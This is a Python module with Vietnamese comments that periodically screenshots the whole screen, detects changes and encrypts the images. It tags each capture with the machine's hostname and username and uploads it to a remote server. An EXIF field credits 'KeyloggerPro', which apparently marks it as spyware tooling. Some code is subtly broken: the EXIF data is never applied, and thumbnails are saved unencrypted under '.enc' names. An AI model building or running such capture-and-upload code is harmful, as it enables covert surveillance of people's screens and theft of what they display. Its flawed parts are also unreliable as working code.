#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Module quản lý việc chụp ảnh màn hình với các tính năng nâng cao:
- Lựa chọn vùng (region) hoặc full screen
- Chụp tự động khi phát hiện thay đổi
- Lên lịch bằng APScheduler
- Rotating file log (xoay log theo ngày)
- Retention policy: xoá ảnh cũ sau X ngày hoặc khi vượt quá dung lượng
- Tùy chọn định dạng & chất lượng ảnh (PNG/JPEG)
- Tạo thumbnail
- Mã hóa AES (Fernet)
- Ghi file bất đồng bộ (ThreadPoolExecutor)
- Hỗ trợ callback sau mỗi lần chụp
- Tự động tải lên máy chủ từ xa
- Exif metadata
- Tạm dừng/tiếp tục bắt sự kiện
"""
import os
import io
import uuid
import time
import logging
import sys
import json
import hashlib
import requests
import numpy as np
from pathlib import Path
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
from threading import Event, Lock
from functools import partial
from io import BytesIO

from apscheduler.schedulers.background import BackgroundScheduler
from apscheduler.triggers.interval import IntervalTrigger
from typing import Callable, Dict, List, Optional, Tuple, Union, Any

from cryptography.fernet import Fernet
from PIL import ImageGrab, Image, ImageChops, ExifTags
from PIL.ExifTags import TAGS
from logging.handlers import TimedRotatingFileHandler

class ScreenshotMonitor:
    """Theo dõi sự thay đổi trên màn hình"""
    
    def __init__(self, sensitivity: float = 0.1, region: Optional[Tuple[int,int,int,int]] = None):
        """
        Khởi tạo monitor theo dõi thay đổi màn hình
        
        Args:
            sensitivity: Ngưỡng nhạy (0.0-1.0), thấp hơn = nhạy hơn
            region: Vùng theo dõi (left, top, right, bottom), None = toàn màn hình
        """
        self.sensitivity = sensitivity
        self.region = region
        self.last_screenshot = None
        self.lock = Lock()  # Để thread-safe
    
    def check_for_changes(self) -> bool:
        """
        Kiểm tra sự thay đổi so với ảnh cuối cùng
        
        Returns:
            bool: True nếu phát hiện thay đổi vượt ngưỡng
        """
        with self.lock:
            current = ImageGrab.grab(bbox=self.region)
            
            # Lần đầu tiên check
            if self.last_screenshot is None:
                self.last_screenshot = current
                return True
            
            # So sánh với ảnh trước
            try:
                # Chuyển sang thang xám để so sánh
                current_gray = current.convert('L')
                last_gray = self.last_screenshot.convert('L')
                
                # Tìm sự khác biệt
                diff = ImageChops.difference(current_gray, last_gray)
                
                # Tính % điểm ảnh thay đổi
                hist = diff.histogram()
                sq = (value * (i % 256) ** 2 for i, value in enumerate(hist))
                sum_sq = sum(sq)
                rms = (sum_sq / float(current.size[0] * current.size[1])) ** 0.5
                
                # Chuẩn hóa thành % (0-1)
                change_percent = min(rms / 255.0, 1.0)
                
                # Cập nhật ảnh cuối
                self.last_screenshot = current
                
                return change_percent > self.sensitivity
            except Exception as e:
                logging.error(f"Lỗi khi so sánh ảnh: {e}")
                self.last_screenshot = current
                return True
    
    def reset(self):
        """Reset bộ theo dõi thay đổi"""
        with self.lock:
            self.last_screenshot = None

class RemoteUploader:
    """Xử lý tải ảnh lên máy chủ từ xa"""
    
    def __init__(
        self, 
        endpoint: str,
        auth_token: Optional[str] = None,
        max_retries: int = 3,
        timeout: int = 30,
        verify_ssl: bool = True
    ):
        """
        Khởi tạo uploader
        
        Args:
            endpoint: URL API endpoint đích
            auth_token: Token xác thực (nếu cần)
            max_retries: Số lần thử lại tối đa
            timeout: Thời gian chờ kết nối (giây)
            verify_ssl: Kiểm tra chứng chỉ SSL
        """
        self.endpoint = endpoint
        self.auth_token = auth_token
        self.max_retries = max_retries
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.executor = ThreadPoolExecutor(max_workers=2)
        
    def upload_async(self, filepath: Union[str, Path], metadata: Dict[str, Any]) -> None:
        """
        Tải file lên server bất đồng bộ
        
        Args:
            filepath: Đường dẫn file cần tải lên
            metadata: Thông tin kèm theo
        """
        self.executor.submit(self._upload, filepath, metadata)
    
    def _upload(self, filepath: Union[str, Path], metadata: Dict[str, Any]) -> bool:
        """
        Thực hiện tải lên và thử lại nếu cần
        
        Args:
            filepath: Đường dẫn file cần tải lên
            metadata: Thông tin kèm theo
            
        Returns:
            bool: True nếu tải lên thành công
        """
        filepath = Path(filepath)
        if not filepath.exists():
            logging.error(f"File không tồn tại: {filepath}")
            return False
        
        headers = {}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        
        for attempt in range(self.max_retries):
            try:
                with open(filepath, "rb") as f:
                    files = {"file": (filepath.name, f, "application/octet-stream")}
                    response = requests.post(
                        self.endpoint,
                        headers=headers,
                        files=files,
                        data={"metadata": json.dumps(metadata)},
                        timeout=self.timeout,
                        verify=self.verify_ssl
                    )
                
                if response.status_code in (200, 201):
                    logging.info(f"Tải lên thành công: {filepath.name}")
                    return True
                else:
                    logging.warning(f"Tải lên thất bại (attempt {attempt+1}): HTTP {response.status_code}")
            
            except Exception as e:
                logging.error(f"Lỗi tải lên (attempt {attempt+1}): {e}")
            
            # Chờ trước khi thử lại (exponential backoff)
            if attempt < self.max_retries - 1:
                time.sleep(2 ** attempt)
        
        return False
    
    def shutdown(self):
        """Đóng executor"""
        self.executor.shutdown(wait=False)

class ScreenshotCapturer:
    """
    Quản lý chụp màn hình với nhiều tuỳ chọn nâng cao.
    """
    def __init__(
        self,
        save_directory: str,
        interval: int = 60,
        region: Optional[Tuple[int,int,int,int]] = None,
        image_format: str = "PNG",
        quality: int = 90,
        encrypt: bool = False,
        encryption_key: Optional[bytes] = None,
        retention_days: int = 7,
        max_storage_mb: Optional[int] = None,
        max_workers: int = 2,
        change_detection: bool = False,
        change_sensitivity: float = 0.1,
        log_to_stdout: bool = False,
        remote_upload: bool = False,
        remote_endpoint: Optional[str] = None,
        remote_token: Optional[str] = None,
        add_metadata: bool = True,
        create_thumbnails: bool = False,  # Thêm tham số mới này
    ):
        # Lưu tham số
        self.create_thumbnails = create_thumbnails
        # Các thiết lập khác...
        """
        Khởi tạo với nhiều tùy chọn
        
        Args:
            save_directory: Thư mục lưu ảnh
            interval: Thời gian giữa các lần chụp (giây)
            region: Vùng chụp (left, top, right, bottom), None = toàn màn hình
            image_format: Định dạng ảnh (PNG/JPEG)
            quality: Chất lượng ảnh (1-100)
            encrypt: Bật mã hóa hay không
            encryption_key: Khóa mã hóa (tự tạo nếu None và encrypt=True)
            retention_days: Số ngày giữ ảnh
            max_storage_mb: Dung lượng tối đa (MB), None = không giới hạn
            max_workers: Số luồng xử lý đồng thời tối đa
            change_detection: Chỉ chụp khi phát hiện thay đổi
            change_sensitivity: Độ nhạy phát hiện thay đổi (0.0-1.0)
            log_to_stdout: Ghi log ra stdout
            remote_upload: Bật tính năng tải lên
            remote_endpoint: URL API endpoint
            remote_token: Token xác thực API
            add_metadata: Thêm metadata vào ảnh
        """
        self.save_directory = Path(save_directory)
        self.save_directory.mkdir(parents=True, exist_ok=True)
        self.interval = interval
        self.region = region
        self.image_format = image_format.upper()
        self.quality = quality
        self.encrypt = encrypt
        self.retention_days = retention_days
        self.max_storage_mb = max_storage_mb
        
        # Cấu hình mã hóa
        if encrypt and encryption_key is None:
            self.encryption_key = Fernet.generate_key()
        else:
            self.encryption_key = encryption_key
            
        # Thiết lập xử lý bất đồng bộ
        self.executor = ThreadPoolExecutor(max_workers=max_workers)
        
        # Scheduler và callbacks
        self.scheduler = BackgroundScheduler()
        self.callbacks: List[Callable[[Dict], None]] = []
        
        # Các đối tượng điều khiển
        self.stop_event = Event()
        self.pause_event = Event()
        
        # Thiết lập change detection
        self.change_detection = change_detection
        if change_detection:
            self.monitor = ScreenshotMonitor(
                sensitivity=change_sensitivity,
                region=region
            )
        
        # Thiết lập remote upload
        self.remote_upload = remote_upload
        if remote_upload and remote_endpoint:
            self.uploader = RemoteUploader(
                endpoint=remote_endpoint,
                auth_token=remote_token
            )
        else:
            self.uploader = None
        
        # Thiết lập metadata
        self.add_metadata = add_metadata
        
        # Thiết lập logger
        self._setup_logger(log_to_stdout)
        
    def _setup_logger(self, log_to_stdout: bool = False):
        """Thiết lập logger"""
        # Tạo thư mục log nếu chưa có
        log_dir = Path("logs")
        log_dir.mkdir(exist_ok=True)
        
        # Tạo logger
        logger_name = f"{__name__}.{id(self)}"
        self.logger = logging.getLogger(logger_name)
        self.logger.setLevel(logging.INFO)
        
        # File handler với xoay theo ngày
        file_handler = TimedRotatingFileHandler(
            log_dir / "screenshot.log", 
            when="midnight", 
            backupCount=7, 
            encoding="utf-8"
        )
        formatter = logging.Formatter("%(asctime)s [%(levelname)s] %(name)s: %(message)s")
        file_handler.setFormatter(formatter)
        self.logger.addHandler(file_handler)
        
        # Thêm stdout handler nếu được yêu cầu
        if log_to_stdout:
            console_handler = logging.StreamHandler(sys.stdout)
            console_handler.setFormatter(formatter)
            self.logger.addHandler(console_handler)

    def start(self):
        """Bắt đầu lịch chụp màn hình."""
        if self.scheduler.running:
            self.logger.warning("Scheduler đã chạy")
            return False
        
        self.logger.info(f"Khởi động chụp màn hình mỗi {self.interval}s")
        self.stop_event.clear()
        self.pause_event.clear()
        
        trigger = IntervalTrigger(seconds=self.interval)
        self.scheduler.add_job(self._capture_job, trigger)
        self.scheduler.start()
        return True

    def stop(self):
        """Dừng lịch chụp."""
        if not self.scheduler.running:
            self.logger.warning("Scheduler chưa chạy")
            return False
        
        self.logger.info("Dừng chụp màn hình")
        self.stop_event.set()
        self.scheduler.shutdown(wait=False)
        self.executor.shutdown(wait=False)
        
        if self.uploader:
            self.uploader.shutdown()
            
        # Reset monitor
        if self.change_detection:
            self.monitor.reset()
            
        return True
    
    def pause(self):
        """Tạm dừng chụp màn hình mà không tắt scheduler"""
        if self.pause_event.is_set():
            self.logger.warning("Đã tạm dừng trước đó")
            return False
        
        self.logger.info("Tạm dừng chụp màn hình")
        self.pause_event.set()
        return True
    
    def resume(self):
        """Tiếp tục chụp màn hình sau khi tạm dừng"""
        if not self.pause_event.is_set():
            self.logger.warning("Không trong trạng thái tạm dừng")
            return False
        
        self.logger.info("Tiếp tục chụp màn hình")
        self.pause_event.clear()
        return True

    def _capture_job(self):
        """Công việc chụp ảnh được APScheduler gọi."""
        if self.stop_event.is_set() or self.pause_event.is_set():
            return
        
        try:
            # Kiểm tra thay đổi nếu bật chế độ theo dõi
            if self.change_detection:
                if not self.monitor.check_for_changes():
                    self.logger.debug("Không phát hiện thay đổi, bỏ qua việc chụp")
                    return
            
            # Thực hiện chụp và xử lý
            metadata = self._take_screenshot()
            
            # Gọi callbacks
            for cb in self.callbacks:
                try:
                    cb(metadata)
                except Exception as e:
                    self.logger.error(f"Callback error: {e}")
            
            # Tải lên từ xa nếu được bật
            if self.remote_upload and self.uploader:
                filepath = metadata.get("filepath")
                if filepath:
                    self.uploader.upload_async(filepath, metadata)
            
            # Dọn dẹp theo chính sách lưu trữ
            self._cleanup_storage()
        except Exception as e:
            self.logger.error(f"Lỗi capture_job: {e}")

    def _take_screenshot(self) -> Dict:
        """Chụp màn hình, lưu file (mã hóa nếu cần) và trả về metadata."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        uid = uuid.uuid4().hex[:8]
        filename = f"scr_{timestamp}_{uid}.{self.image_format.lower()}"
        filepath = self.save_directory / filename

        # Chụp (full hoặc region)
        if self.region:
            img = ImageGrab.grab(bbox=self.region)
        else:
            img = ImageGrab.grab()

        # Thu thập metadata
        metadata = {
            "timestamp": timestamp,
            "uuid": uid,
            "filepath": str(filepath),
            "size": f"{img.width}x{img.height}",
            "encrypted": self.encrypt,
            "region": self.region,
            "hostname": os.environ.get("COMPUTERNAME", os.environ.get("HOSTNAME", "unknown")),
            "username": os.environ.get("USERNAME", os.environ.get("USER", "unknown")),
        }
        
        # Ghi file bất đồng bộ
        self.executor.submit(self._save_image, img, filepath, metadata)
        
        self.logger.info(f"Đã chụp screenshot: {filename}")
        return metadata

    def _save_image(self, image: Image.Image, path: Path, metadata: Dict):
        """Lưu ảnh với format, chất lượng và mã hóa tuỳ chọn."""
        try:
            # Thêm metadata EXIF nếu được yêu cầu
            if self.add_metadata and self.image_format == "JPEG":
                exif_data = self._create_exif_metadata(metadata)
                # Đảm bảo ảnh ở chế độ RGB cho JPEG
                if image.mode != "RGB":
                    image = image.convert("RGB")
                image_with_exif = self._add_exif_to_image(image, exif_data)
                img_to_save = image_with_exif
            else:
                img_to_save = image
            
            # Lưu vào buffer
            buf = io.BytesIO()
            save_params = {"format": self.image_format}
            
            if self.image_format == "JPEG":
                save_params["quality"] = self.quality
                if image.mode != "RGB":
                    img_to_save = img_to_save.convert("RGB")
            
            img_to_save.save(buf, **save_params)
            data = buf.getvalue()

            # Mã hóa nếu bật
            output_path = path
            if self.encrypt and self.encryption_key:
                f = Fernet(self.encryption_key)
                data = f.encrypt(data)
                output_path = path.with_suffix(path.suffix + ".enc")

            # Ghi file
            with open(output_path, "wb") as f_out:
                f_out.write(data)

            # Tạo thumbnail
            thumb_path = output_path.with_name(output_path.stem + "_thumb" + output_path.suffix)
            thumb = image.copy()
            thumb.thumbnail((200, 200))
            thumb.save(thumb_path, format="PNG")

            self.logger.debug(f"Đã lưu ảnh tại {output_path}")
        except Exception as e:
            self.logger.error(f"Lỗi khi lưu ảnh: {e}")
    
    def _create_exif_metadata(self, metadata: Dict) -> Dict:
        """Tạo metadata EXIF từ thông tin ảnh chụp"""
        # Tạo dictionary EXIF
        exif_dict = {
            0x9286: json.dumps(metadata),  # UserComment
            0x9c9b: metadata.get("uuid", ""),  # XP Comment
            0x9c9c: f"Screenshot {metadata.get('timestamp', '')}",  # XP Subject
            0x9c9d: f"Screenshot on {metadata.get('hostname', '')}",  # XP Title
            0x9c9e: f"Captured by KeyloggerPro",  # XP Author
        }
        return exif_dict
    
    def _add_exif_to_image(self, image: Image.Image, exif_data: Dict) -> Image.Image:
        """Thêm metadata EXIF vào ảnh"""
        exif_bytes = image.info.get("exif", b"")
        try:
            # Tạo bản sao để không thay đổi ảnh gốc
            img_copy = image.copy()
            
            # Chuyển đổi exif_data thành bytes
            exif_buffer = BytesIO()
            img_copy.save(exif_buffer, format="JPEG", exif=exif_bytes)
            
            # Lưu với exif mới
            exif_buffer = BytesIO()
            img_copy.save(exif_buffer, format="JPEG", exif=exif_bytes)
            
            # Tạo ảnh mới từ buffer
            exif_buffer.seek(0)
            return Image.open(exif_buffer)
        except Exception as e:
            self.logger.error(f"Lỗi khi thêm EXIF: {e}")
            return image

    def _get_dir_size_mb(self) -> float:
        """Tính tổng dung lượng thư mục lưu trữ (MB)"""
        total_size = sum(f.stat().st_size for f in self.save_directory.glob('**/*') if f.is_file())
        return total_size / (1024 * 1024)  # Chuyển byte sang MB

    def _cleanup_storage(self):
        """
        Dọn dẹp bộ nhớ theo chính sách:
        1. Xóa file cũ hơn X ngày
        2. Xóa file cũ nhất nếu vượt quá dung lượng tối đa
        """
        try:
            # 1. Xóa file cũ theo thời gian
            cutoff_date = datetime.now() - timedelta(days=self.retention_days)
            old_files = []
            
            for f in self.save_directory.glob('**/*'):
                if f.is_file():
                    try:
                        mtime = datetime.fromtimestamp(f.stat().st_mtime)
                        if mtime < cutoff_date:
                            f.unlink()
                            self.logger.info(f"Xóa file cũ: {f.name}")
                    except Exception as e:
                        self.logger.error(f"Lỗi khi xóa file cũ {f.name}: {e}")
            
            # 2. Kiểm tra dung lượng tối đa
            if self.max_storage_mb:
                current_size_mb = self._get_dir_size_mb()
                
                if current_size_mb > self.max_storage_mb:
                    self.logger.warning(
                        f"Vượt quá dung lượng: {current_size_mb:.2f}MB/{self.max_storage_mb}MB"
                    )
                    
                    # Lấy danh sách file theo thời gian
                    files = [(f, f.stat().st_mtime) for f in self.save_directory.glob('**/*') if f.is_file()]
                    files.sort(key=lambda x: x[1])  # Sắp xếp theo thời gian tạo
                    
                    # Xóa file cũ nhất cho đến khi đạt ngưỡng an toàn (90%)
                    target_size = self.max_storage_mb * 0.9
                    for f, _ in files:
                        try:
                            f.unlink()
                            self.logger.info(f"Xóa file để giảm dung lượng: {f.name}")
                            
                            # Kiểm tra lại dung lượng
                            current_size_mb = self._get_dir_size_mb()
                            if current_size_mb <= target_size:
                                break
                        except Exception as e:
                            self.logger.error(f"Lỗi khi xóa file {f.name}: {e}")
        
        except Exception as e:
            self.logger.error(f"Lỗi trong quá trình dọn dẹp: {e}")

    def extract_region(self, region: Tuple[int,int,int,int], output_dir: Optional[Path] = None) -> List[Path]:
        """
        Trích xuất vùng cụ thể từ ảnh đã chụp
        
        Args:
            region: Vùng cần trích xuất (left, top, right, bottom)
            output_dir: Thư mục đầu ra, mặc định = thư mục lưu ảnh
            
        Returns:
            List[Path]: Danh sách đường dẫn file đã trích xuất
        """
        if output_dir is None:
            output_dir = self.save_directory
        else:
            output_dir = Path(output_dir)
            output_dir.mkdir(parents=True, exist_ok=True)
        
        extracted_files = []
        
        # Tìm tất cả file ảnh (không bao gồm thumbnail)
        pattern = f"*.{self.image_format.lower()}"
        if self.encrypt:
            pattern += ".enc"
            
        image_files = [f for f in self.save_directory.glob(pattern) 
                      if not f.name.endswith("_thumb" + f.suffix)]
        
        for img_path in image_files:
            try:
                # Đọc ảnh
                if self.encrypt and self.encryption_key:
                    with open(img_path, "rb") as f:
                        encrypted_data = f.read()
                    fernet = Fernet(self.encryption_key)
                    decrypted_data = fernet.decrypt(encrypted_data)
                    img = Image.open(io.BytesIO(decrypted_data))
                else:
                    img = Image.open(img_path)
                
                # Cắt vùng
                cropped = img.crop(region)
                
                # Tạo tên file đầu ra
                output_name = f"{img_path.stem}_crop_{region[0]}_{region[1]}_{region[2]}_{region[3]}{img_path.suffix}"
                output_path = output_dir / output_name
                
                # Lưu ảnh đã cắt
                cropped.save(output_path, format=self.image_format, quality=self.quality)
                extracted_files.append(output_path)
                
                self.logger.info(f"Đã trích xuất vùng từ {img_path.name} -> {output_name}")
                
            except Exception as e:
                self.logger.error(f"Lỗi khi trích xuất vùng từ {img_path.name}: {e}")
        
        return extracted_files

    def register_callback(self, func: Callable[[Dict], None]):
        """Đăng ký hàm callback nhận metadata sau mỗi capture."""
        self.callbacks.append(func)
        return True

    def unregister_callback(self, func: Callable[[Dict], None]):
        """Hủy đăng ký callback"""
        if func in self.callbacks:
            self.callbacks.remove(func)
            return True
        return False

    def set_interval(self, interval: int):
        """Cập nhật interval trong lúc đang chạy."""
        self.interval = interval
        if self.scheduler.running:
            self.stop()
            self.start()

    def set_retention(self, days: int):
        """Cập nhật chính sách giữ file."""
        self.retention_days = days
        
    def set_max_storage(self, max_mb: Optional[int]):
        """Cập nhật giới hạn dung lượng lưu trữ"""
        self.max_storage_mb = max_mb
        
    def set_region(self, region: Optional[Tuple[int,int,int,int]]):
        """Cập nhật vùng chụp màn hình"""
        self.region = region
        # Cập nhật monitor nếu đang dùng
        if self.change_detection:
            self.monitor.region = region
            self.monitor.reset()

    def set_change_detection(self, enabled: bool, sensitivity: Optional[float] = None):
        """Bật/tắt chế độ phát hiện thay đổi"""
        self.change_detection = enabled
        
        if enabled:
            if not hasattr(self, 'monitor'):
                sens = sensitivity if sensitivity is not None else 0.1
                self.monitor = ScreenshotMonitor(sensitivity=sens, region=self.region)
            elif sensitivity is not None:
                self.monitor.sensitivity = sensitivity
                self.monitor.reset()
        
    def get_screenshots_info(self) -> List[Dict]:
        """Lấy thông tin về các ảnh đã chụp"""
        screenshots = []
        
        pattern = f"*.{self.image_format.lower()}"
        if self.encrypt:
            pattern += ".enc"
            
        for f in sorted(self.save_directory.glob(pattern), 
                       key=lambda x: x.stat().st_mtime, reverse=True):
            if "_thumb" not in f.name:  # Bỏ qua thumbnail
                try:
                    stats = f.stat()
                    info = {
                        "filename": f.name,
                        "path": str(f),
                        "size_bytes": stats.st_size,
                        "created": datetime.fromtimestamp(stats.st_ctime).isoformat(),
                        "modified": datetime.fromtimestamp(stats.st_mtime).isoformat(),
                        "thumbnail": str(f.with_name(f.stem + "_thumb" + f.suffix)) 
                            if (f.with_name(f.stem + "_thumb" + f.suffix)).exists() else None
                    }
                    screenshots.append(info)
                except Exception as e:
                    self.logger.error(f"Lỗi khi lấy thông tin file {f.name}: {e}")
        
        return screenshots

# Hàm tiện ích
def get_display_info() -> List[Dict]:
    """
    Lấy thông tin về các màn hình hiển thị
    
    Returns:
        List[Dict]: Danh sách thông tin màn hình
    """
    try:
        # Sử dụng PIL để lấy kích thước màn hình chính
        full_screen = ImageGrab.grab()
        main_width, main_height = full_screen.size
        
        screens = [{
            "id": 0,
            "primary": True,
            "bounds": (0, 0, main_width, main_height),
            "width": main_width,
            "height": main_height,
        }]
        
        # Thử tìm thông tin màn hình bổ sung (triển khai đầy đủ hơn có thể cần MSS hoặc các thư viện như PyWin32)
        return screens
    except Exception as e:
        logging.error(f"Lỗi khi lấy thông tin màn hình: {e}")
        return []

# Ví dụ sử dụng:
if __name__ == "__main__":
    # Tạo khóa mã hóa
    key = Fernet.generate_key()
    
    # Cấu hình nâng cao
    cap = ScreenshotCapturer(
        save_directory="screenshots",
        interval=120,                   # Chụp mỗi 2 phút
        region=None,                    # Toàn màn hình
        image_format="PNG",
        quality=90,
        encrypt=True,                   # Bật mã hóa
        encryption_key=key,
        retention_days=3,               # Giữ ảnh 3 ngày
        max_storage_mb=500,             # Giới hạn 500MB
        change_detection=True,          # Chỉ chụp khi có thay đổi
        change_sensitivity=0.05,        # Nhạy với thay đổi nhỏ
        log_to_stdout=True,             # Log ra console
    )
    
    # Đăng ký callback
    def process_screenshot(metadata):
        print(f"Đã chụp: {metadata['filepath']} vào lúc {metadata['timestamp']}")
    
    cap.register_callback(process_screenshot)
    
    # Khởi động
    cap.start()
    
    # Trong ứng dụng thực tế, thay vì vòng lặp vô hạn
    # bạn sẽ tích hợp vào giao diện người dùng
    try:
        import time
        print("Đang chạy... Nhấn Ctrl+C để dừng")
        
        # Ví dụ về tạm dừng sau 5 giây
        time.sleep(5)
        print("Tạm dừng 10 giây")
        cap.pause()
        time.sleep(10)
        
        # Tiếp tục
        print("Tiếp tục")
        cap.resume()
        
        # Chạy vĩnh viễn
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("Đang dừng...")
        cap.stop()
        print("Đã dừng")